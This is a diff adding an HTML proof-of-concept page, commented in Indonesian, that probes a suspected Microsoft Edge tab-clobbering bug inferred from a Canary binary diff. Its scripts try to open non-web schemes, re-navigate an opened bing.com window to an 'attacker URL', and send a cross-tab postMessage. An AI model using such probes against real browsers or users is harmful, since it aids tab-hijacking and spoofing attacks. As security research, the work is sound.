@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC: ContextualTasks tab clobbering (stable v154)</title>
+<style>
+  body { font-family: 'Segoe UI', sans-serif; padding:40px; background:#f0f4ff; }
+  button { padding:14px 24px; background:#0078d4; color:#fff; border:none;
+           border-radius:6px; font-size:15px; cursor:pointer; margin:8px 0; display:block; }
+  pre { font-size:12px; background:#fff; padding:14px; border-radius:6px; margin-top:14px; white-space:pre-wrap; }
+</style>
+</head>
+<body>
+<h3>PoC: ContextualTasks tab clobbering</h3>
+<p>
+<b>Binary diff finding:</b> Canary v157 menambahkan trace baru:<br>
+<code>"ContextualTasks navigation trace: OnThreadLinkClicked clobbering active tab"</code><br>
+<code>"ContextualTasks navigation trace: OpenUrl clobbering active tab"</code><br>
+<code>"ContextualTasks navigation trace: HandleNavigationImpl returning false, non-web scheme from embedded page"</code><br>
+<br>
+Trace ini TIDAK ada di stable. Artinya di stable, tab clobbering mungkin terjadi tanpa detect.
+"non-web scheme from embedded page" = embedded page bisa inject scheme non-web (intent:, tel:, edge://).
+</p>
+
+<hr>
+<h4>Test 1: Inject non-web scheme dari embedded page</h4>
+<button onclick="test1()">Run Test 1</button>
+<pre id="log1"></pre>
+
+<h4>Test 2: Tab clobbering via window.open + navigasi</h4>
+<button onclick="test2()">Run Test 2</button>
+<pre id="log2"></pre>
+
+<h4>Test 3: Thread link click clobbering</h4>
+<button onclick="test3()">Run Test 3</button>
+<pre id="log3"></pre>
+
+<script>
+function log(id, m){ document.getElementById(id).textContent += m + '\n'; }
+
+// Test 1: Inject non-web scheme dari embedded page
+// Canary: "non-web scheme from embedded page" = check baru
+// Stable: check belum ada = scheme injection mungkin bisa
+function test1(){
+  log('log1', 'Test 1: Inject non-web scheme dari embedded page');
+  log('log1', '  Canary check: "HandleNavigationImpl returning false, non-web scheme"');
+  log('log1', '');
+
+  // Coba inject berbagai non-web scheme
+  var schemes = [
+    'tel:+1234567890',
+    'mailto:test@test.com',
+    'intent://test#Intent;package=com.microsoft.emmx;end',
+    'edge://settings',
+    'edge://favorites',
+    'microsoft-edge://',
+    'read://https://www.microsoft.com'
+  ];
+
+  schemes.forEach(function(scheme, i){
+    log('log1', '  [' + i + '] Coba: ' + scheme);
+    try {
+      var w = window.open(scheme, '_blank');
+      log('log1', '      → window.open: ' + (w ? 'OBJECT (tidak diblokir!)' : 'null (diblokir)'));
+    } catch(e) {
+      log('log1', '      → Error: ' + e.message);
+    }
+  });
+
+  log('log1', '');
+  log('log1', '  JIKA scheme non-web tidak diblokir di stable = check belum ada');
+  log('log1', '  JIKA diblokir di canary = fix sudah masuk');
+  log('log1', '  Test ini di Edge Stable & Canary, bandingkan hasilnya.');
+}
+
+// Test 2: Tab clobbering
+// "OpenUrl clobbering active tab" = URL di tab aktif ditimpa
+function test2(){
+  log('log2', 'Test 2: Tab clobbering via window.open');
+  log('log2', '  Canary check: "OpenUrl clobbering active tab"');
+  log('log2', '');
+
+  // Buka window ke target legit
+  log('log2', '  Buka window ke bing.com (tab aktif)...');
+  var w = window.open('https://www.bing.com/', '_blank');
+
+  // Coba clobber: navigasi tab aktif ke URL attacker
+  setTimeout(function(){
+    log('log2', '  Coba navigasi window ke attacker URL...');
+    try {
+      w.location = 'https://httpbin.org/get';
+      log('log2', '  → w.location = attacker URL: BERHASIL (clobbering!)');
+      log('log2', '  → Cek: address bar window = bing.com atau httpbin?');
+    } catch(e) {
+      log('log2', '  → Error: ' + e.message + ' (cross-origin block)');
+    }
+
+    log('log2', '');
+    log('log2', '  JIKA address bar masih bing.com tapi konten httpbin = CLOBBER (bug)');
+    log('log2', '  JIKA address bar update ke httpbin = normal (bukan bug)');
+  }, 1000);
+}
+
+// Test 3: Thread link click clobbering
+// "OnThreadLinkClicked clobbering active tab" = link click di thread
+function test3(){
+  log('log3', 'Test 3: Thread link click clobbering');
+  log('log3', '  Canary check: "OnThreadLinkClicked clobbering active tab"');
+  log('log3', '');
+
+  // Simulasi: buka 2 tab, klik link di tab 1 yang navigasi tab 2
+  log('log3', '  Buka window A (halaman ini = attacker)...');
+  log('log3', '  Buka window B ke bing.com...');
+  var wB = window.open('https://www.bing.com/', '_blank');
+
+  log('log3', '  Coba navigasi window B dari window A (cross-tab navigation)...');
+  setTimeout(function(){
+    try {
+      // Coba window.opener navigasi
+      if (window.opener && window.opener !== wB) {
+        log('log3', '  window.opener exists');
+      }
+      // Coba postMessage ke window B
+      wB.postMessage({type: 'clobber-test', url: 'https://httpbin.org/get'}, '*');
+      log('log3', '  postMessage ke window B: terkirim');
+      log('log3', '  → Cek apakah window B navigasi (clobber)');
+    } catch(e) {
+      log('log3', '  Error: ' + e.message);
+    }
+  }, 1500);
+}
+</script>
+</body>
+</html>
